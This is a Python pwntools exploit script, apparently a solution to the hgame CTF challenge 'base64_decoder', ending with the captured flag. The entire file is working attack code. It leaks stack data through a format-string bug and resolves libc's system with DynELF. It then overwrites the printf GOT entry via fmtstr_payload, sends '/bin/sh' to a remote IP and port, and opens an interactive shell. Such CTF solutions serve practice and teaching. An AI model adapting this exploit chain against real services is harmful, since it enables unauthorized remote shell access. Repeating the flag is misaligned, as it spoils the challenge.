#coding=utf8
from pwn import *
import base64

# context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./base64_decoder')
	bin = ELF('./base64_decoder')
else:
	cn = remote('111.230.149.72',10013)
	bin = ELF('./base64_decoder')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def sendpay(s):
	cn.sendline(base64.b64encode(s))

def leak(address):
	sendpay( "STRT"+ "%10$s" + "END" + p32(address))
	cn.recvuntil("STRT")
	data = cn.recvuntil("END")[:-3]
	print hexdump(data)
	if data=='':
		return '\x00'
	return data

sendpay('AAAA%2$xBBBB')
cn.recvuntil('AAAA')
stack = int(cn.recvuntil('BBBB')[:-4],16)
success(hex(stack))

pay = p32(stack-0x110)+'A'*0xb0+'%7$hhn'
sendpay(pay)

d = DynELF(leak,elf=bin,libcdb=False)
system = d.lookup('system','libc')

pay = fmtstr_payload(7,{bin.got['printf']:system})
sendpay(pay)
cn.sendline(base64.b64encode('/bin/sh'))
cn.interactive()

#hgame{B3_c4r3fu1_wi7h_fmt}
